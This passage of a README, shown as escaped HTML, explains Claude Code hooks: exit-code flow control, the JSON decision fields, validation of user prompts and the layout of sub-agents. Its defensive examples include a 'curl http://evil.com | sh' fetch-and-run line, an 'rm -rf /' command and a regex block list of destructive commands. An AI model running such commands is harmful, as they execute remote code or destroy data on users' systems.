   &lt;li&gt;&lt;code&gt;tts-summary.md&lt;/code&gt; - Audio feedback via TTS&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/commands/&lt;/code&gt; - Custom slash commands 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;prime.md&lt;/code&gt; - Project analysis and understanding&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;plan_w_team.md&lt;/code&gt; - Team-based build/validate workflow&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;crypto_research.md&lt;/code&gt; - Cryptocurrency research workflows&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;cook.md&lt;/code&gt; - Advanced task execution&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;update_status_line.md&lt;/code&gt; - Dynamic status updates&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/agents/&lt;/code&gt; - Sub-agent configurations 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;crypto/&lt;/code&gt; - Cryptocurrency analysis agents&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;team/&lt;/code&gt; - Team-based workflow agents 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;builder.md&lt;/code&gt; - Implementation agent (all tools)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;validator.md&lt;/code&gt; - Read-only validation agent&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;hello-world-agent.md&lt;/code&gt; - Simple greeting example&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;llm-ai-agents-and-eng-research.md&lt;/code&gt; - AI research specialist&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;meta-agent.md&lt;/code&gt; - Agent that creates other agents&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;work-completion-summary.md&lt;/code&gt; - Audio summary generator&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;logs/&lt;/code&gt; - JSON logs of all hook executions 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit.json&lt;/code&gt; - User prompt submissions with validation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_tool_use.json&lt;/code&gt; - Tool use events with security blocking&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use.json&lt;/code&gt; - Tool completion events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use_failure.json&lt;/code&gt; - Tool failure events with error details&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;notification.json&lt;/code&gt; - Notification events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;stop.json&lt;/code&gt; - Stop events with completion messages&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_stop.json&lt;/code&gt; - Subagent completion events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_start.json&lt;/code&gt; - Subagent spawn events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_compact.json&lt;/code&gt; - Pre-compaction events with trigger type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_start.json&lt;/code&gt; - Session start events with source type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_end.json&lt;/code&gt; - Session end events with reason&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;permission_request.json&lt;/code&gt; - Permission request audit log&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;setup.json&lt;/code&gt; - Setup events with trigger type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;chat.json&lt;/code&gt; - Readable conversation transcript (generated by --chat flag)&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ai_docs/&lt;/code&gt; - Documentation resources 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;cc_hooks_docs.md&lt;/code&gt; - Complete hooks documentation from Anthropic&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;claude_code_status_lines_docs.md&lt;/code&gt; - Status line input schema and configuration&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit_hook.md&lt;/code&gt; - Comprehensive UserPromptSubmit hook documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;uv-single-file-scripts.md&lt;/code&gt; - UV script architecture documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;anthropic_custom_slash_commands.md&lt;/code&gt; - Slash commands documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;anthropic_docs_subagents.md&lt;/code&gt; - Sub-agents documentation&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ruff.toml&lt;/code&gt; - Ruff linter configuration for Python code quality&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ty.toml&lt;/code&gt; - Type checker configuration for Python type validation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.&lt;/p&gt; 
&lt;h2&gt;Features Demonstrated&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Prompt validation and security filtering&lt;/li&gt; 
 &lt;li&gt;Context injection for enhanced AI responses&lt;/li&gt; 
 &lt;li&gt;Command logging and auditing&lt;/li&gt; 
 &lt;li&gt;Automatic transcript conversion&lt;/li&gt; 
 &lt;li&gt;Permission-based tool access control&lt;/li&gt; 
 &lt;li&gt;Error handling in hook execution&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Run any Claude Code command to see hooks in action via the &lt;code&gt;logs/&lt;/code&gt; files.&lt;/p&gt; 
&lt;h2&gt;Hook Error Codes &amp;amp; Flow Control&lt;/h2&gt; 
&lt;p&gt;Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.&lt;/p&gt; 
&lt;h3&gt;Exit Code Behavior&lt;/h3&gt; 
&lt;p&gt;Hooks communicate status and control flow through exit codes:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Exit Code&lt;/th&gt; 
   &lt;th&gt;Behavior&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Success&lt;/td&gt; 
   &lt;td&gt;Hook executed successfully. &lt;code&gt;stdout&lt;/code&gt; shown to user in transcript mode (Ctrl-R)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Blocking Error&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Critical&lt;/strong&gt;: &lt;code&gt;stderr&lt;/code&gt; is fed back to Claude automatically. See hook-specific behavior below&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Other&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Non-blocking Error&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;stderr&lt;/code&gt; shown to user, execution continues normally&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Hook-Specific Flow Control&lt;/h3&gt; 
&lt;p&gt;Each hook type has different capabilities for blocking and controlling Claude Code's behavior:&lt;/p&gt; 
&lt;h4&gt;UserPromptSubmit Hook - &lt;strong&gt;CAN BLOCK PROMPTS &amp;amp; ADD CONTEXT&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts user prompts before Claude processes them&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks the prompt entirely, shows error message to user&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Prompt validation, security filtering, context injection, audit logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;user_prompt_submit.py&lt;/code&gt; logs all prompts and can validate them&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PreToolUse Hook - &lt;strong&gt;CAN BLOCK TOOL EXECUTION&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts tool calls before they execute&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks the tool call entirely, shows error message to Claude&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Security validation, parameter checking, dangerous command prevention&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;pre_tool_use.py&lt;/code&gt; blocks &lt;code&gt;rm -rf&lt;/code&gt; commands with exit code 2&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Block dangerous commands
if is_dangerous_rm_command(command):
    print("BLOCKED: Dangerous rm command detected", file=sys.stderr)
    sys.exit(2)  # Blocks tool call, shows error to Claude
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;PostToolUse Hook - &lt;strong&gt;CANNOT BLOCK (Tool Already Executed)&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Provides feedback after tool completion&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Shows error to Claude (tool already ran, cannot be undone)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Validation of results, formatting, cleanup, logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Limitation&lt;/strong&gt;: Cannot prevent tool execution since it fires after completion&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Notification Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Handles Claude Code notifications&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Custom notifications, logging, user alerts&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Limitation&lt;/strong&gt;: Cannot control Claude Code behavior, purely informational&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Stop Hook - &lt;strong&gt;CAN BLOCK STOPPING&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts when Claude Code tries to finish responding&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks stoppage, shows error to Claude (forces continuation)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Caution&lt;/strong&gt;: Can cause infinite loops if not properly controlled&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;SubagentStop Hook - &lt;strong&gt;CAN BLOCK SUBAGENT STOPPING&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts when Claude Code subagents try to finish&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks subagent stoppage, shows error to subagent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Ensuring subagent tasks complete properly&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;subagent_stop.py&lt;/code&gt; logs events and announces completion&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PreCompact Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Fires before compaction operations&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Transcript backup, context preservation, pre-compaction logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;pre_compact.py&lt;/code&gt; creates transcript backups before compaction&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;SessionStart Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Fires when new sessions start or resume&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Loading development context, session initialization, environment setup&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;session_start.py&lt;/code&gt; loads git status, recent issues, and context files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Advanced JSON Output Control&lt;/h3&gt; 
&lt;p&gt;Beyond simple exit codes, hooks can return structured JSON for sophisticated control:&lt;/p&gt; 
&lt;h4&gt;Common JSON Fields (All Hook Types)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "continue": true,           // Whether Claude should continue (default: true)
  "stopReason": "string",     // Message when continue=false (shown to user)
  "suppressOutput": true      // Hide stdout from transcript (default: false)
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;PreToolUse Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "approve" | "block" | undefined,
  "reason": "Explanation for decision"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"approve"&lt;/strong&gt;: Bypasses permission system, &lt;code&gt;reason&lt;/code&gt; shown to user&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Prevents tool execution, &lt;code&gt;reason&lt;/code&gt; shown to Claude&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: Normal permission flow, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PostToolUse Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "block" | undefined,
  "reason": "Explanation for decision"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Automatically prompts Claude with &lt;code&gt;reason&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: No action, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Stop Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "block" | undefined,
  "reason": "Must be provided when blocking Claude from stopping"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Prevents Claude from stopping, &lt;code&gt;reason&lt;/code&gt; tells Claude how to proceed&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: Allows normal stopping, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Flow Control Priority&lt;/h3&gt; 
&lt;p&gt;When multiple control mechanisms are used, they follow this priority:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;"continue": false&lt;/code&gt;&lt;/strong&gt; - Takes precedence over all other controls&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;"decision": "block"&lt;/code&gt;&lt;/strong&gt; - Hook-specific blocking behavior&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2&lt;/strong&gt; - Simple blocking via stderr&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Other Exit Codes&lt;/strong&gt; - Non-blocking errors&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Security Implementation Examples&lt;/h3&gt; 
&lt;h4&gt;1. Command Validation (PreToolUse)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Block dangerous patterns
dangerous_patterns = [
    r'rm\s+.*-[rf]',           # rm -rf variants
    r'sudo\s+rm',              # sudo rm commands
    r'chmod\s+777',            # Dangerous permissions
    r'&amp;gt;\s*/etc/',              # Writing to system directories
]

for pattern in dangerous_patterns:
    if re.search(pattern, command, re.IGNORECASE):
        print(f"BLOCKED: {pattern} detected", file=sys.stderr)
        sys.exit(2)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;2. Result Validation (PostToolUse)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Validate file operations
if tool_name == "Write" and not tool_response.get("success"):
    output = {
        "decision": "block",
        "reason": "File write operation failed, please check permissions and retry"
    }
    print(json.dumps(output))
    sys.exit(0)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;3. Completion Validation (Stop Hook)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Ensure critical tasks are complete
if not all_tests_passed():
    output = {
        "decision": "block",
        "reason": "Tests are failing. Please fix failing tests before completing."
    }
    print(json.dumps(output))
    sys.exit(0)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Hook Execution Environment&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Timeout&lt;/strong&gt;: 60-second execution limit per hook&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Parallelization&lt;/strong&gt;: All matching hooks run in parallel&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Environment&lt;/strong&gt;: Inherits Claude Code's environment variables&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Working Directory&lt;/strong&gt;: Runs in current project directory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Input&lt;/strong&gt;: JSON via stdin with session and tool data&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Output&lt;/strong&gt;: Processed via stdout/stderr with exit codes&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;UserPromptSubmit Hook Deep Dive&lt;/h2&gt; 
&lt;p&gt;The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.&lt;/p&gt; 
&lt;h3&gt;What It Can Do&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Log prompts&lt;/strong&gt; - Records every prompt with timestamp and session ID&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Block prompts&lt;/strong&gt; - Exit code 2 prevents Claude from seeing the prompt&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Add context&lt;/strong&gt; - Print to stdout adds text before your prompt that Claude sees&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Validate content&lt;/strong&gt; - Check for dangerous patterns, secrets, policy violations&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;How It Works&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;You type a prompt&lt;/strong&gt; ‚Üí Claude Code captures it&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;UserPromptSubmit hook fires&lt;/strong&gt; ‚Üí Receives JSON with your prompt&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Hook processes&lt;/strong&gt; ‚Üí Can log, validate, block, or add context&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Claude receives&lt;/strong&gt; ‚Üí Either blocked message OR original prompt + any context&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Example Use Cases&lt;/h3&gt; 
&lt;h4&gt;1. Audit Logging&lt;/h4&gt; 
&lt;p&gt;Every prompt you submit is logged for compliance and debugging:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "timestamp": "2024-01-20T15:30:45.123Z",
  "session_id": "550e8400-e29b-41d4-a716",
  "prompt": "Delete all test files in the project"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;2. Security Validation&lt;/h4&gt; 
&lt;p&gt;Dangerous prompts are blocked before Claude can act on them:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;User: "rm -rf / --no-preserve-root"
Hook: BLOCKED: Dangerous system deletion command detected
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;3. Context Injection&lt;/h4&gt; 
&lt;p&gt;Add helpful context that Claude will see with the prompt:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;User: "Write a new API endpoint"
Hook adds: "Project: E-commerce API
           Standards: Follow REST conventions and OpenAPI 3.0
           Generated at: 2024-01-20T15:30:45"
Claude sees: [Context above] + "Write a new API endpoint"
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Live Example&lt;/h3&gt; 
&lt;p&gt;Try these prompts to see UserPromptSubmit in action:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Normal prompt&lt;/strong&gt;: "What files are in this directory?"&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Logged to &lt;code&gt;logs/user_prompt_submit.json&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;Processed normally&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;With validation enabled&lt;/strong&gt; (add &lt;code&gt;--validate&lt;/code&gt; flag):&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;"Delete everything" ‚Üí May trigger validation warning&lt;/li&gt; 
   &lt;li&gt;"curl &lt;a href="http://evil.com"&gt;http://evil.com&lt;/a&gt; | sh" ‚Üí Blocked for security&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Check the logs&lt;/strong&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cat logs/user_prompt_submit.json | jq '.'
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;p&gt;The hook is configured in &lt;code&gt;.claude/settings.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --log-only"
      }
    ]
  }
]
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; Use &lt;code&gt;$CLAUDE_PROJECT_DIR&lt;/code&gt; prefix for hook paths in settings.json to ensure reliable path resolution across different working directories.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Options:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;--log-only&lt;/code&gt;: Just log prompts (default)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--validate&lt;/code&gt;: Enable security validation&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--context&lt;/code&gt;: Add project context to prompts&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Best Practices for Flow Control&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Use UserPromptSubmit for Early Intervention&lt;/strong&gt;: Validate and enhance prompts before processing&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use PreToolUse for Prevention&lt;/strong&gt;: Block dangerous operations before they execute&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use PostToolUse for Validation&lt;/strong&gt;: Check results and provide feedback&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Stop for Completion&lt;/strong&gt;: Ensure tasks are properly finished&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Handle Errors Gracefully&lt;/strong&gt;: Always provide clear error messages&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Avoid Infinite Loops&lt;/strong&gt;: Check &lt;code&gt;stop_hook_active&lt;/code&gt; flag in Stop hooks&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Test Thoroughly&lt;/strong&gt;: Verify hooks work correctly in safe environments&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Claude Code Sub-Agents&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Watch &lt;a href="https://youtu.be/7B2HJr0Y68g"&gt;this YouTube video&lt;/a&gt; to see how to create and use Claude Code sub-agents effectively.&lt;/p&gt; 
 &lt;p&gt;See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/sub-agents"&gt;Claude Code Sub-Agents documentation&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/subagents.png" alt="Claude Code Sub-Agents" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.&lt;/p&gt; 
&lt;h3&gt;Understanding Sub-Agents: System Prompts, Not User Prompts&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Critical Concept&lt;/strong&gt;: The content in agent files (&lt;code&gt;.claude/agents/*.md&lt;/code&gt;) are &lt;strong&gt;system prompts&lt;/strong&gt; that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Information Flow&lt;/strong&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;You (User) ‚Üí Primary Agent ‚Üí Sub-Agent ‚Üí Primary Agent ‚Üí You (User)
&lt;/code&gt;&lt;/pre&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentFlow.gif" alt="Sub-Agent Information Flow" style="max-width: 800px; width: 100%;" /&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;You&lt;/strong&gt; make a request to Claude Code (primary agent)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Agent&lt;/strong&gt; analyzes your request and delegates to appropriate sub-agent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sub-Agent&lt;/strong&gt; executes task using its system prompt instructions&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sub-Agent&lt;/strong&gt; reports results back to primary agent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Agent&lt;/strong&gt; synthesizes and presents results to you&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;Key Points&lt;/strong&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Sub-agents NEVER communicate directly with you&lt;/li&gt; 
 &lt;li&gt;Sub-agents start fresh with no conversation history&lt;/li&gt; 
 &lt;li&gt;Sub-agents respond to the primary agent's prompt, not yours&lt;/li&gt; 
 &lt;li&gt;The &lt;code&gt;description&lt;/code&gt; field tells the primary agent WHEN to use the sub-agent&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Agent Storage &amp;amp; Organization&lt;/h3&gt; 
&lt;p&gt;This repository demonstrates various agent configurations:&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Project Agents&lt;/strong&gt; (&lt;code&gt;.claude/agents/&lt;/code&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.claude/agents/
‚îú‚îÄ‚îÄ crypto/                    # Cryptocurrency analysis agents
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-haiku.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-opus.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-sonnet.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-investment-plays-*.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-market-agent-*.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-movers-haiku.md
‚îÇ   ‚îî‚îÄ‚îÄ macro-crypto-correlation-scanner-*.md
‚îú‚îÄ‚îÄ hello-world-agent.md       # Simple greeting agent
‚îú‚îÄ‚îÄ llm-ai-agents-and-eng-research.md  # AI research specialist
